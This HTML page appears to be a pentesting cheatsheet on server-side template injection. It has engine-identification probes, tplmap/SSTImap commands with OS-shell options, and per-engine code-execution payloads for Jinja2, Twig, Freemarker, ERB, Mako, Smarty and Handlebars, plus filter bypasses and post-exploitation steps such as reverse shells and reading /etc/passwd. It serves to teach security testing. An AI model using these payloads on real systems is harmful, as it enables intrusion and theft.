@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SSTI | JinPwn</title><meta name="description" content="User input rendered through a server-side template engine. Almost always escalates to RCE.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web06-ssti/">
+<meta property="og:title" content="SSTI | JinPwn">
+<meta property="og:description" content="User input rendered through a server-side template engine. Almost always escalates to RCE.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web06-ssti/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="SSTI | JinPwn">
+<meta name="twitter:description" content="User input rendered through a server-side template engine. Almost always escalates to RCE.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"User input rendered through a server-side template engine. Almost always escalates to RCE.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"SSTI | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web06-ssti/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link is-current">SSTI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>SSTI</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">SSTI</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Web Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link is-current">SSTI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>User input rendered through a server-side template engine. Almost always escalates to RCE.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
+</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
+    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Anywhere the app puts user input into a templated output:</p>
+<ul>
+<li>Profile fields displayed on a &ldquo;welcome, {name}&rdquo; page</li>
+<li>Email templates (&ldquo;Hi {firstname}&rdquo;)</li>
+<li>Error pages echoing user input</li>
+<li>Search results that personalize the page</li>
+<li>Generated PDF reports (often Jinja2 / wkhtmltopdf)</li>
+<li>Wiki / CMS preview features</li>
+<li>Notification messages</li>
+<li>Admin-configurable templates exposed via UI</li>
+</ul>
+<p>Signal that you&rsquo;re dealing with templating, not just reflection:</p>
+<ul>
+<li>Math operators evaluated server-side (<code>{{7*7}}</code> → <code>49</code> in body)</li>
+<li>Template-style errors when you inject braces (<code>UndefinedError</code>, <code>TemplateSyntaxError</code>, <code>Liquid syntax error</code>)</li>
+<li>Multiple bracket styles all behave differently</li>
+</ul>
+<h2 id="ii-engine-identification" data-heading-permalink="true"><span class="heading-content">ii. Engine identification</span>
+    <a class="heading-permalink" href="#ii-engine-identification" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The first job is figuring out the engine. Each has a distinctive math probe:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Probe</th>
+          <th>Engine</th>
+          <th>Stack</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>{{7*7}}</code> → <code>49</code></td>
+          <td>Jinja2, Twig, Mako, Liquid, Django, Smarty (most common)</td>
+          <td>Python, PHP, Ruby, Liquid (Shopify), Pug</td>
+      </tr>
+      <tr>
+          <td><code>{{7*'7'}}</code> → <code>49</code> (numeric)</td>
+          <td>Twig (PHP)</td>
+          <td>PHP</td>
+      </tr>
+      <tr>
+          <td><code>{{7*'7'}}</code> → <code>7777777</code></td>
+          <td>Jinja2</td>
+          <td>Python (Flask, Django, Ansible)</td>
+      </tr>
+      <tr>
+          <td><code>${7*7}</code> → <code>49</code></td>
+          <td>Freemarker, Velocity</td>
+          <td>Java</td>
+      </tr>
+      <tr>
+          <td><code>#{7*7}</code> → <code>49</code></td>
+          <td>Ruby ERB, Slim</td>
+          <td>Ruby</td>
+      </tr>
+      <tr>
+          <td><code>&lt;%= 7*7 %&gt;</code> → <code>49</code></td>
+          <td>ERB, EJS</td>
+          <td>Ruby, Node.js</td>
+      </tr>
+      <tr>
+          <td><code>*{7*7}</code> → <code>49</code></td>
+          <td>Thymeleaf</td>
+          <td>Java</td>
+      </tr>
+      <tr>
+          <td><code>{php}echo 7*7;{/php}</code></td>
+          <td>Smarty</td>
+          <td>PHP</td>
+      </tr>
+      <tr>
+          <td><code>@(7*7)</code></td>
+          <td>Razor</td>
+          <td>.NET</td>
+      </tr>
+      <tr>
+          <td><code>{{=7*7}}</code></td>
+          <td>dot.js, doT</td>
+          <td>Node.js</td>
+      </tr>
+      <tr>
+          <td><code>{{#with &quot;test&quot;}}{{7*7}}{{/with}}</code></td>
+          <td>Handlebars</td>
+          <td>Node.js</td>
+      </tr>
+  </tbody>
+</table>
+<p>Best practice: try several probes and observe responses. The PortSwigger SSTI decision tree at the end of this file is exhaustive - keep it open while triaging.</p>
+<h2 id="iii-tplmap-and-sstimap" data-heading-permalink="true"><span class="heading-content">iii. tplmap and SSTImap</span>
+    <a class="heading-permalink" href="#iii-tplmap-and-sstimap" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>tplmap is the original (Python 2, somewhat dated):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tplmap.py -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?name=test*&#34;</span>
+</span></span><span class="line"><span class="cl">tplmap.py -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page&#34;</span> --data <span class="s1">&#39;name=test*&#39;</span>
+</span></span><span class="line"><span class="cl">tplmap.py -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api&#34;</span> --cookie <span class="s1">&#39;session=abc*&#39;</span>
+</span></span><span class="line"><span class="cl">tplmap.py -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?name=test*&#34;</span> --os-shell
+</span></span></code></pre></div><p>SSTImap is the modern Python 3 fork (active maintenance):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sstimap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?name=test*&#34;</span>
+</span></span><span class="line"><span class="cl">sstimap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?name=test&#34;</span> --os-shell
+</span></span><span class="line"><span class="cl">sstimap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?name=test&#34;</span> --eval-cmd <span class="s1">&#39;id&#39;</span>
+</span></span><span class="line"><span class="cl">sstimap -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/page?name=test&#34;</span> --eval-file payload.py
+</span></span></code></pre></div><p>Both auto-detect the engine and apply the right escape chain.</p>
+<h2 id="iv-manual-exploitation-chains" data-heading-permalink="true"><span class="heading-content">iv. Manual exploitation chains</span>
+    <a class="heading-permalink" href="#iv-manual-exploitation-chains" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Each engine has its own escape from sandboxed template context into Python / Ruby / Java / etc. The chains change as libraries patch, so use HackTricks per-engine pages as the source of truth. Below: just the &ldquo;I&rsquo;m in, now what&rdquo; tools per engine.</p>
+<h3 id="jinja2-python---flask-django-jinja-extension" data-heading-permalink="true"><span class="heading-content">Jinja2 (Python - Flask, Django Jinja extension)</span>
+    <a class="heading-permalink" href="#jinja2-python---flask-django-jinja-extension" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>The classic escape pattern uses Python&rsquo;s class inheritance to reach <code>os</code> / <code>subprocess</code>. Modern Jinja2 sandboxing blocks <code>__globals__</code> and <code>mro</code> in some configs, so you may need to chain through <code>subclasses()</code> of <code>object</code>.</p>
+<p>Common one-liner shape (modern Jinja2):</p>
+<pre tabindex="0"><code>{{ cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() }}
+{{ lipsum.__globals__.os.popen(&#39;id&#39;).read() }}
+{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() }}
+</code></pre><p>Full reference: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - Jinja2</a>
+</p>
+<h3 id="twig-php" data-heading-permalink="true"><span class="heading-content">Twig (PHP)</span>
+    <a class="heading-permalink" href="#twig-php" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Sandbox bypasses depend on the Twig version. Recent versions are tighter, older versions accept <code>_self</code>:</p>
+<pre tabindex="0"><code>{{ _self.env.registerUndefinedFilterCallback(&#34;exec&#34;) }}{{ _self.env.getFilter(&#34;id&#34;) }}
+</code></pre><h3 id="freemarker--velocity-java" data-heading-permalink="true"><span class="heading-content">Freemarker / Velocity (Java)</span>
+    <a class="heading-permalink" href="#freemarker--velocity-java" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Freemarker:</p>
+<pre tabindex="0"><code>&lt;#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt; ${ ex(&#34;id&#34;) }
+</code></pre><p>Velocity:</p>
+<pre tabindex="0"><code>#set($e=&#34;exp&#34;+&#34;loit&#34;)
+#set($r=$e.getClass().forName(&#34;java.lang.Runtime&#34;))
+</code></pre><h3 id="erb--ruby" data-heading-permalink="true"><span class="heading-content">ERB / Ruby</span>
+    <a class="heading-permalink" href="#erb--ruby" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>&lt;%= `id` %&gt;
+&lt;%= system(&#39;id&#39;) %&gt;
+&lt;%= Kernel.system(&#39;id&#39;) %&gt;
+&lt;%= eval(&#39;`id`&#39;) %&gt;
+</code></pre><h3 id="mako-python" data-heading-permalink="true"><span class="heading-content">Mako (Python)</span>
+    <a class="heading-permalink" href="#mako-python" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>${self.module.cache.util.os.popen(&#39;id&#39;).read()}
+</code></pre><h3 id="smarty-php" data-heading-permalink="true"><span class="heading-content">Smarty (PHP)</span>
+    <a class="heading-permalink" href="#smarty-php" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>{php}echo `id`;{/php}             ## Smarty &lt; 3
+{system($_GET[c])}                ## with system() exposed
+</code></pre><h3 id="handlebars-nodejs" data-heading-permalink="true"><span class="heading-content">Handlebars (Node.js)</span>
+    <a class="heading-permalink" href="#handlebars-nodejs" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Sandbox-escape via constructor chain:</p>
+<pre tabindex="0"><code>{{#with &#34;constructor&#34;}}
+  {{#with split as |a|}}
+    {{this.pop}}{{this.push &#34;return require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#34;}}
+    ...
+</code></pre><p>Full payload on PayloadsAllTheThings - Handlebars chains are long.</p>
+<h2 id="v-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">v. Tricks worth knowing</span>
+    <a class="heading-permalink" href="#v-tricks-worth-knowing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="try-probes-that-look-harmless" data-heading-permalink="true"><span class="heading-content">Try probes that look harmless</span>
+    <a class="heading-permalink" href="#try-probes-that-look-harmless" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>When <code>{{</code> and <code>}}</code> are filtered, the engine may still accept other syntax. Many engines support multiple delimiter styles:</p>
+<pre tabindex="0"><code>{%= 7*7 %}        ## ERB-like
+${ 7*7 }          ## EL / Freemarker
+&lt;%= 7*7 %&gt;        ## ERB style
+{{= 7*7 }}        ## dot
+</code></pre><h3 id="polyglot-to-detect-engine-in-one-shot" data-heading-permalink="true"><span class="heading-content">Polyglot to detect engine in one shot</span>
+    <a class="heading-permalink" href="#polyglot-to-detect-engine-in-one-shot" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p><a href="https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti#:~:text=%24%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C%2E" target="_blank" rel="noopener noreferrer">Polygot</a>
+</p>
+<p>Different engines fail in different ways. Read the error message - it names the engine.</p>
+<h3 id="look-at-framework-not-the-page" data-heading-permalink="true"><span class="heading-content">Look at framework, not the page</span>
+    <a class="heading-permalink" href="#look-at-framework-not-the-page" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If you see Flask in the response (<code>Werkzeug</code> in error pages, <code>Set-Cookie: session=eyJ...</code>), templates are almost always Jinja2. If you see Spring (<code>X-Application-Context</code> header, Spring error pages), templates are usually Thymeleaf or Freemarker.</p>
+<h3 id="pdf-generators" data-heading-permalink="true"><span class="heading-content">PDF generators</span>
+    <a class="heading-permalink" href="#pdf-generators" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Look for &ldquo;Download as PDF&rdquo; / &ldquo;Print invoice&rdquo; features. Backend often uses wkhtmltopdf, weasyprint, or pdfkit with HTML+Jinja2. Try injecting <code>{{}}</code> into name fields, see if the rendered PDF evaluates them.</p>
+<h3 id="email-template-injection" data-heading-permalink="true"><span class="heading-content">Email template injection</span>
+    <a class="heading-permalink" href="#email-template-injection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>&ldquo;Email me a copy&rdquo; features often render an HTML email through a templating engine. Same surface, different output. Check email source for evaluated expressions.</p>
+<h3 id="server-side-xss-thats-actually-ssti" data-heading-permalink="true"><span class="heading-content">Server-side XSS that&rsquo;s actually SSTI</span>
+    <a class="heading-permalink" href="#server-side-xss-thats-actually-ssti" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>A reflected <code>{{</code> that survives = SSTI candidate, not just XSS. Always test math before concluding it&rsquo;s &ldquo;just XSS.&rdquo;</p>
+<h3 id="filter-bypass" data-heading-permalink="true"><span class="heading-content">Filter bypass</span>
+    <a class="heading-permalink" href="#filter-bypass" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Concatenation: <code>{{ &quot;id&quot; }}</code> becomes a string. Build forbidden keywords from concatenation:
+<pre tabindex="0"><code>{{ &#34;po&#34;+&#34;pen&#34; }}
+</code></pre></li>
+<li>Hex / unicode encoding in some engines:
+<pre tabindex="0"><code>{{ &#34;\x69d&#34; }}
+</code></pre></li>
+<li>Attribute access via <code>[]</code>:
+<pre tabindex="0"><code>{{ &#34;&#34;[&#39;__class__&#39;] }}    ## same as &#34;&#34;.&#34;__class__&#34;
+</code></pre></li>
+</ul>
+<h2 id="vi-tools-to-keep-handy" data-heading-permalink="true"><span class="heading-content">vi. Tools to keep handy</span>
+    <a class="heading-permalink" href="#vi-tools-to-keep-handy" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li><strong>tplmap</strong> / <strong>SSTImap</strong> - detection + exploit framework</li>
+<li><strong>interactsh</strong> - blind detection via OAST when math probes fail to render visibly</li>
+<li><strong>Burp Intruder</strong> with engine-specific payload lists</li>
+</ul>
+<h2 id="vii-references" data-heading-permalink="true"><span class="heading-content">vii. References</span>
+    <a class="heading-permalink" href="#vii-references" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener noreferrer">PortSwigger - SSTI</a>
+</li>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting" target="_blank" rel="noopener noreferrer">PortSwigger - SSTI methodology</a>
+</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - SSTI</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank" rel="noopener noreferrer">HackTricks - SSTI</a>
+</li>
+<li><a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener noreferrer">James Kettle - SSTI research</a>
+ - original paper</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/detect.txt" target="_blank" rel="noopener noreferrer">SSTI decision tree</a>
+ - branching probe set</li>
+</ul>
+<h2 id="viii-where-it-leads" data-heading-permalink="true"><span class="heading-content">viii. Where it leads</span>
+    <a class="heading-permalink" href="#viii-where-it-leads" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Almost every SSTI is RCE-equivalent. After confirming the math probe and finding a working escape:</p>
+<ol>
+<li>Spawn a reverse shell payload through the engine&rsquo;s exec chain, see [[Reverse Shells]]</li>
+<li>Land on the host → [[03 Shell &amp; Tooling]]</li>
+<li>Local enum → [[05 Local Enum]]</li>
+<li>On cloud → metadata endpoint via OAST request from inside, see [[Cloud Recon]]</li>
+</ol>
+<p>If the engine&rsquo;s sandbox blocks command exec but allows arbitrary attribute access, escalate via file read:</p>
+<ul>
+<li>Read <code>/etc/passwd</code>, app configs, env vars</li>
+<li>Read source code for additional attack surface</li>
+<li>Look for stored creds, see [[11 PrivEsc - Credentials &amp; Files]]</li>
+</ul>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web05-command-injection/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Command Injection</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web08-xss/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">XSS</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
